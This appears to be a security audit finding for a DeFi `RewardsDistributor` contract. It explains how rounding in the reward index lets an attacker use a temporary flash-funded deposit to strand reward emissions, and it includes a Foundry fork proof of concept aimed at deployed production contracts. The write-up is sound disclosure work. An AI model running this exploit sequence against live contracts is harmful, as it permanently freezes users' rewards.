### Title

Emission rounding can permanently strand reward tokens in `RewardsDistributor` - (File: contracts/RewardsDistributor.sol)

### Summary

`RewardsDistributor` distributes emissions proportionally through a global reward index. Each update calculates `index += elapsed * speed / totalSupply` using half-up WAD division, while account rewards are later derived by multiplying the index delta by each account balance. [1](#0-0) [2](#0-1) 

When the index increment rounds down, part of an emitted reward is never assigned to any account. When it rounds up, aggregate accrued rewards can exceed the amount emitted. Downward rounding leaves reward-token balance in the contract, but the only token transfer path pays each account its accrued amount; there is no sweep or residual-withdrawal path. [3](#0-2) 

An unprivileged attacker can increase the tracked `DepositToken` supply with a flash-funded deposit, trigger a public index update while the supply is inflated, and withdraw the collateral afterward. [4](#0-3) [5](#0-4)  Because the rounding error is bounded by approximately `totalSupply / 2e18`, supply inflation can turn a normally negligible rounding remainder into a material amount of unclaimable rewards.

### Finding Description

The affected accounting path is:

1. `_calculateTokenIndex()` derives `_tokensAccrued = elapsed * tokenSpeed`.
2. It converts that amount into a per-share index using `_tokensAccrued.wadDiv(totalSupply)`.
3. `_calculateTokenDelta()` credits an account with `balance.wadMul(indexDelta)`.
4. `claimRewards()` pays only `tokensAccruedOf[account]`. [6](#0-5) [7](#0-6) [8](#0-7) 

For one update, let:

```text
E = elapsed * speed
D = floor((E * 1e18 + totalSupply / 2) / totalSupply)
L ≈ E - D * totalSupply / 1e18
```

If `D` rounds down, `L` is emitted but not assigned. The maximum downward rounding remainder approaches `totalSupply / 2e18`, so inflating `totalSupply` increases the amount that can be stranded. If `E * 1e18 < totalSupply / 2`, `D` is zero and the entire emission interval is skipped. [9](#0-8) 

`updateBeforeMintOrBurn()` is public and updates both the global index and the supplied account. [5](#0-4)  `DepositToken.deposit()` calls its reward-update hook before minting through `updateRewardsBeforeMintOrBurn`, allowing an attacker to establish the pre-inflation timestamp and then inflate the denominator. [10](#0-9) [11](#0-10) 

The stranded amount is not claimable later: `tokensAccruedOf` is the only accounting source paid by `_transferRewardIfEnoughTokens()`, and the contract has no `TokenHolder.sweep()` or equivalent recovery function. [12](#0-11) [3](#0-2) 

### Impact Explanation

This permanently freezes unclaimed yield in `RewardsDistributor`. Users cannot recover a rounded-down emission because it is never added to `tokensAccruedOf`, while no other function can transfer the residual reward-token balance. [13](#0-12) [3](#0-2) 

A sufficiently large temporary deposit can cause an entire emission interval to round to zero, or can make the sub-integer index remainder economically significant. If the index instead rounds up, aggregate claims can exceed funded emissions; the last claimants then have accrued balances that cannot be paid until additional rewards accumulate because an underfunded claim silently performs no transfer. [3](#0-2) 

### Likelihood Explanation

Exploitation requires an incentivized `DepositToken` with nonzero `tokenSpeed` and enough supply-cap room to inflate `totalSupply`. The attacker does not need a privileged role: depositing, withdrawing, calling `updateBeforeMintOrBurn()`, and claiming rewards are all public paths. [14](#0-13) [5](#0-4) 

The practical severity is bounded by deposit supply caps, available liquidity or flash-loan depth, deposit/withdraw fees, and the configured emission speed. [15](#0-14)  A deployed reward token whose cap is close to its actual supply may only suffer ordinary rounding dust, but a token with large cap room can lose a materially larger remainder.

### Recommendation

Track undistributed emission carry explicitly and add it to the next index update instead of losing the remainder. For example, retain a fixed-point numerator or a cumulative `undistributedRewards` value so that:

```text
indexDelta = (emitted + carry) / totalSupply
carry      = (emitted + carry) % totalSupply
```

Alternatively, use a higher-precision index such that the maximum aggregate remainder is economically negligible, and expose an explicit governed recovery function for truly surplus rewards. Any recovery function must exclude amounts already represented by `tokensAccruedOf`.

### Proof of Concept

The following Foundry fork test demonstrates the strongest case: inflation makes a one-second emission round to a zero index increment. Use deployed production addresses for a reward distributor, an incentivized `DepositToken`, and its underlying token.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IRewardsDistributor {
    function tokenSpeeds(address token) external view returns (uint256);
    function tokenStates(address token) external view returns (uint224 index, uint32 timestamp);
    function updateBeforeMintOrBurn(address token, address account) external;
}

interface IDepositToken {
    function underlying() external view returns (address);
    function totalSupply() external view returns (uint256);
    function maxTotalSupply() external view returns (uint256);
    function deposit(uint256 amount, address onBehalfOf) external returns (uint256, uint256);
    function withdraw(uint256 amount, address to) external returns (uint256, uint256);
}

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract RewardsIndexRoundingForkTest is Test {
    function test_supplyInflationStrandsOneEmissionInterval() external {
        IRewardsDistributor distributor =
            IRewardsDistributor(vm.envAddress("REWARDS_DISTRIBUTOR"));
        IDepositToken depositToken =
            IDepositToken(vm.envAddress("DEPOSIT_TOKEN"));
        address rewardToken =
            vm.envAddress("REWARD_TOKEN");

        uint256 speed = distributor.tokenSpeeds(address(depositToken));
        require(speed > 0, "select an incentivized token");

        uint256 supplyBefore = depositToken.totalSupply();

        // Make:
        //   speed * 1e18 / inflatedSupply < 0.5
        // so WadRayMath.wadDiv() rounds the index increment to zero.
        uint256 targetSupply = (2 * speed * 1e18) + 1;
        require(targetSupply > supplyBefore, "supply already too large");

        uint256 inflation = targetSupply - supplyBefore;

        // Ensure the chosen deployed market has enough cap room.
        uint256 cap = depositToken.maxTotalSupply();
        require(targetSupply <= cap, "choose a market with sufficient cap room");

        address underlying = depositToken.underlying();
        address attacker = makeAddr("attacker");

        // Fork setup only: provide collateral that could alternatively be flash-borrowed.
        deal(underlying, attacker, inflation);
        IERC20Like(underlying).approve(address(depositToken), inflation);

        // Establish the previous timestamp before inflation.
        distributor.updateBeforeMintOrBurn(address(depositToken), attacker);

        // Inflate the denominator.
        (uint256 mintedDepositToken,) =
            depositToken.deposit(inflation, attacker);
        assertGt(mintedDepositToken, 0);

        (uint224 indexBefore,) =
            distributor.tokenStates(address(depositToken));

        uint256 rewardsBefore =
            IERC20Like(rewardToken).balanceOf(address(distributor));

        // Emit `speed` reward units while supply is inflated.
        vm.warp(block.timestamp + 1);

        // Any account can trigger the public index update.
        distributor.updateBeforeMintOrBurn(address(depositToken), attacker);

        (uint224 indexAfter,) =
            distributor.tokenStates(address(depositToken));

        // The full one-second emission rounded to a zero index increment.
        assertEq(indexAfter, indexBefore);

        // The emitted amount was not accrued to any account and remains in the
        // distributor's reward-token balance.
        assertEq(
            IERC20Like(rewardToken).balanceOf(address(distributor)),
            rewardsBefore
        );

        // The attacker exits the temporary position.
        depositToken.withdraw(mintedDepositToken, attacker);
    }
}
```

The production transaction sequence is `updateBeforeMintOrBurn → deposit → warp → updateBeforeMintOrBurn → withdraw`; all mutating calls are public. The skipped interval remains held as distributor reward-token balance because no account index delta is produced and only accrued balances can be transferred out. [16](#0-15) [3](#0-2)
